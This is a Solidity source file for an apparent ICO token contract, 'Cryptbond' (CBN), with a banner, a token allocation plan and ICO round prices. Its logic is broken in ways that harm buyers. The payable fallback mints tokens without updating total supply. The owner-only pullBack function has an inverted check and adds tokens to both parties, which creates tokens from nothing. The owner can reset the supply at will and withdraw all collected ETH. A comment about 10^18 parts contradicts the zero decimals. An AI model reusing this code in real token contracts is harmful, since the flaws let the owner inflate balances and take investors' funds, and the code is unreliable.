1 /**
2  * Do you have any questions or suggestions? Emails us @ support@cryptbond.net
3  * 
4  * ===================== CRYPTBOND NETWORK =======================*
5   oooooooo8 oooooooooo ooooo  oooo oooooooooo  ooooooooooo oooooooooo    ooooooo  oooo   oooo ooooooooo   
6 o888     88  888    888  888  88    888    888 88  888  88  888    888 o888   888o 8888o  88   888    88o 
7 888          888oooo88     888      888oooo88      888      888oooo88  888     888 88 888o88   888    888 
8 888o     oo  888  88o      888      888            888      888    888 888o   o888 88   8888   888    888 
9  888oooo88  o888o  88o8   o888o    o888o          o888o    o888ooo888    88ooo88  o88o    88  o888ooo88   
10                                                                                                           
11         oooo   oooo ooooooooooo ooooooooooo oooo     oooo  ooooooo  oooooooooo  oooo   oooo                       
12          8888o  88   888    88  88  888  88  88   88  88 o888   888o 888    888  888  o88                         
13          88 888o88   888ooo8        888       88 888 88  888     888 888oooo88   888888                           
14          88   8888   888    oo      888        888 888   888o   o888 888  88o    888  88o                         
15         o88o    88  o888ooo8888    o888o        8   8      88ooo88  o888o  88o8 o888o o888o                      
16 *                                                                
17 * ===============================================================*
18 **/
19 /*
20  For ICO: 50%
21 - For Founders: 10% 
22 - For Team: 10% 
23 - For Advisors: 10%
24 - For Airdrop: 20%
25 ✅ ICO Timeline:
26 1️⃣ ICO Round 1:
27  1 ETH = 1,000,000 CBN
28 2️⃣ ICO Round 2:
29  1 ETH = 900,000 CBN
30 3️⃣ ICO Round 3:
31  1 ETH = 750,000 CBN
32 4️⃣ICO Round 4:
33  1 ETH = 600,000 CBN
34 ✅ When CBN list on Exchanges:
35 - All token sold out
36 - End of ICO
37 
38 */ 
39 
40 /**
41  * @title Crowdsale
42  * @dev Crowdsale is a base contract for managing a token crowdsale.
43  * Crowdsales have a start and end timestamps, where investors can make
44  * token purchases and the crowdsale will assign them tokens based
45  * on a token per ETH rate. Funds collected are forwarded to a wallet
46  * as they arrive.
47  */
48 pragma solidity ^0.4.24;
49  
50 library SafeMath {
51   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
52     uint256 c = a * b;
53     assert(a == 0 || c / a == b);
54     return c;
55   }
56 
57  function div(uint256 a, uint256 b) internal pure returns (uint256) {
58     assert(b > 0); // Solidity automatically throws when dividing by 0
59     uint256 c = a / b;
60     assert(a == b * c + a % b); // There is no case in which this doesn't hold
61     return c;
62   }
63 
64   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
65     assert(b <= a);
66     return a - b;
67   }
68 
69   function add(uint256 a, uint256 b) internal pure returns (uint256) {
70     uint256 c = a + b;
71     assert(c >= a);
72     return c;
73   }
74 }
75 
76 contract Ownable {
77   address public owner;
78 
79 
80   event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
81 
82 
83   /**
84    * @dev The Ownable constructor sets the original `owner` of the contract to the sender
85    * account.
86    */
87   function Ownable() public {
88     owner = msg.sender;
89     
90   }
91 
92 
93   /**
94    * @dev Throws if called by any account other than the owner.
95    */
96   modifier onlyOwner() {
97     require(msg.sender == owner);
98     _;
99   }
100 
101 
102   /**
103    * @dev Allows the current owner to transfer control of the contract to a newOwner.
104    * @param newOwner The address to transfer ownership to.
105    */
106   function transferOwnership(address newOwner) onlyOwner public {
107          if(msg.sender != owner){
108             revert();
109          }
110          else{
111             require(newOwner != address(0));
112             OwnershipTransferred(owner, newOwner);
113             owner = newOwner;
114          }
115              
116     }
117 
118 }
119 
120 /**
121  * @title ERC20Standard
122  * @dev Simpler version of ERC20 interface
123  * @dev see https://github.com/ethereum/EIPs/issues/179
124  */
125 contract ERC20Interface {
126      function totalSupply() public constant returns (uint);
127      function balanceOf(address tokenOwner) public constant returns (uint balance);
128      function allowance(address tokenOwner, address spender) public constant returns (uint remaining);
129      function transfer(address to, uint tokens) public returns (bool success);
130      function approve(address spender, uint tokens) public returns (bool success);
131      function transferFrom(address from, address to, uint tokens) public returns (bool success);
132      event Transfer(address indexed from, address indexed to, uint tokens);
133      event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
134 }
135 
136 contract Cryptbond is ERC20Interface,Ownable {
137 
138    using SafeMath for uint256;
139     uint256 public totalSupply;
140     mapping(address => uint256) tokenBalances;
141    
142    string public constant name = "Cryptbond";
143    string public constant symbol = "CBN";
144    uint256 public constant decimals = 0;
145 
146    uint256 public constant INITIAL_SUPPLY = 3000000000;
147     address ownerWallet;
148    // Owner of account approves the transfer of an amount to another account
149    mapping (address => mapping (address => uint256)) allowed;
150    event Debug(string message, address addr, uint256 number);
151 
152     function CBN (address wallet) onlyOwner public {
153         if(msg.sender != owner){
154             revert();
155          }
156         else{
157         ownerWallet=wallet;
158         totalSupply = 3000000000;
159         tokenBalances[wallet] = 3000000000;   //Since we divided the token into 10^18 parts
160         }
161     }
162     
163  /**
164   * @dev transfer token for a specified address
165   * @param _to The address to transfer to.
166   * @param _value The amount to be transferred.
167   */
168   function transfer(address _to, uint256 _value) public returns (bool) {
169     require(tokenBalances[msg.sender]>=_value);
170     tokenBalances[msg.sender] = tokenBalances[msg.sender].sub(_value);
171     tokenBalances[_to] = tokenBalances[_to].add(_value);
172     Transfer(msg.sender, _to, _value);
173     return true;
174   }
175   
176   
177      /**
178    * @dev Transfer tokens from one address to another
179    * @param _from address The address which you want to send tokens from
180    * @param _to address The address which you want to transfer to
181    * @param _value uint256 the amount of tokens to be transferred
182    */
183   function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
184     require(_to != address(0));
185     require(_value <= tokenBalances[_from]);
186     require(_value <= allowed[_from][msg.sender]);
187 
188     tokenBalances[_from] = tokenBalances[_from].sub(_value);
189     tokenBalances[_to] = tokenBalances[_to].add(_value);
190     allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
191     Transfer(_from, _to, _value);
192     return true;
193   }
194  
195     uint price = 0.000001 ether;
196     function() public payable {
197         
198         uint toMint = msg.value/price;
199         //totalSupply += toMint;
200         tokenBalances[msg.sender]+=toMint;
201         Transfer(0,msg.sender,toMint);
202         
203      }     
204      /**
205    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
206    *
207    * Beware that changing an allowance with this method brings the risk that someone may use both the old
208    * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this
209    * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:
210    * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
211    * @param _spender The address which will spend the funds.
212    * @param _value The amount of tokens to be spent.
213    */
214   function approve(address _spender, uint256 _value) public returns (bool) {
215     allowed[msg.sender][_spender] = _value;
216     Approval(msg.sender, _spender, _value);
217     return true;
218   }
219 
220      // ------------------------------------------------------------------------
221      // Total supply
222      // ------------------------------------------------------------------------
223      function totalSupply() public constant returns (uint) {
224          return totalSupply  - tokenBalances[address(0)];
225      }
226      
227      // ------------------------------------------------------------------------
228      // Returns the amount of tokens approved by the owner that can be
229      // transferred to the spender's account
230      // ------------------------------------------------------------------------
231      function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {
232          return allowed[tokenOwner][spender];
233      }
234      // ------------------------------------------------------------------------
235      // Accept ETH
236      // ------------------------------------------------------------------------
237    function withdraw() onlyOwner public {
238         if(msg.sender != owner){
239             revert();
240          }
241          else{
242         uint256 etherBalance = this.balance;
243         owner.transfer(etherBalance);
244          }
245     }
246   /**
247   * @dev Gets the balance of the specified address.
248   * @param _owner The address to query the the balance of.
249   * @return An uint256 representing the amount owned by the passed address.
250   */
251   function balanceOf(address _owner) constant public returns (uint256 balance) {
252     return tokenBalances[_owner];
253   }
254 
255     function pullBack(address wallet, address buyer, uint256 tokenAmount) public onlyOwner {
256         require(tokenBalances[buyer]<=tokenAmount);
257         tokenBalances[buyer] = tokenBalances[buyer].add(tokenAmount);
258         tokenBalances[wallet] = tokenBalances[wallet].add(tokenAmount);
259         Transfer(buyer, wallet, tokenAmount);
260      }
261     function showMyTokenBalance(address addr) public view returns (uint tokenBalance) {
262         tokenBalance = tokenBalances[addr];
263     }
264 }